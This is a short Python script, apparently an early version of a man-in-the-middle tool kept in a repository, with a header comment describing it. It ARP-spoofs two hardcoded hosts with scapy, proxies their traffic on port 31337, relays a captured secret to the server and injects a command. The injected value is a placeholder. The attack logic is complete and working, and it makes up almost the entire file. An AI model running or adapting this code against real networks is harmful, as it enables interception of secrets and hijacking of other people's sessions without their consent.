# The first version, kept as written (minus an unreachable loop at the end).
#
# Two hardcoded addresses, one ARP spoof in each direction, a proxy on 31337,
# and a payload sent after the server asked for a command. About 30 lines of
# logic, no arguments, no cleanup. mitm.py is the same idea with the interfaces
# filed off, not a cleverer one.
#
# The payload constant and the two print statements around it are placeholders:
# whatever the intercepted protocol accepts is a local detail, not part of the
# technique, and it does not belong in a public repository.

import socket
from scapy.all import *
import threading, time

print("vesion 2")

client_mac = getmacbyip("10.0.0.2")
server_mac = getmacbyip("10.0.0.3")
mine_mac = getmacbyip("10.0.0.1")
injection = b'your-command'   # placeholder: put in whatever the protocol expects


def accepting_client(conn, clt_address):
    try:
        sock_like_host = socket.socket()
        sock_like_host.settimeout(5)
        sock_like_host.connect(("10.0.0.3", 31337))
        print('pretending like a host')
        data_from_server = sock_like_host.recv(1024)
        print(f"data from server - {data_from_server}")
        conn.sendall(data_from_server)
        print('resending first request of secret')
        secret = conn.recv(1024)
        sock_like_host.sendall(secret)
        print("resent secret")
        command_r = sock_like_host.recv(1024)
        print(f"asking about command was sent - {command_r}")
        sock_like_host.sendall(injection)
        print("payload sent, reading the response")
        response = sock_like_host.recv(1024)
        print(f"response - {response}")
        conn.close()
        sock_like_host.close()
    except (ConnectionError, socket.timeout) as e:
        print(f"failed because {e}")
    finally:
        conn.close()


def listening_socket():
    sock_main = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock_main.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock_main.bind(("0.0.0.0", 31337))
    sock_main.listen()
    print('Socket now listening')
    while True:
        try:
            conn, clt_address = sock_main.accept()
            if clt_address[0] == "10.0.0.2":
                threading.Thread(target=accepting_client, args=(conn, clt_address), daemon=True).start()
        except ConnectionError:
            continue

lesten = threading.Thread(target=listening_socket, daemon=True)
lesten.start()
for_client_arp = Ether(dst=client_mac, src=mine_mac, type="ARP")/ARP(op="is-at", hwdst=client_mac, hwsrc=mine_mac, pdst="10.0.0.2", psrc="10.0.0.3")
for_server_arp = Ether(dst=server_mac, src=mine_mac, type="ARP")/ARP(op="is-at", hwdst=server_mac, hwsrc=mine_mac, pdst="10.0.0.3", psrc="10.0.0.2")
while True:
    sendp(for_client_arp, iface="eth0", verbose=False)
    sendp(for_server_arp, iface="eth0", verbose=False)
    time.sleep(1)
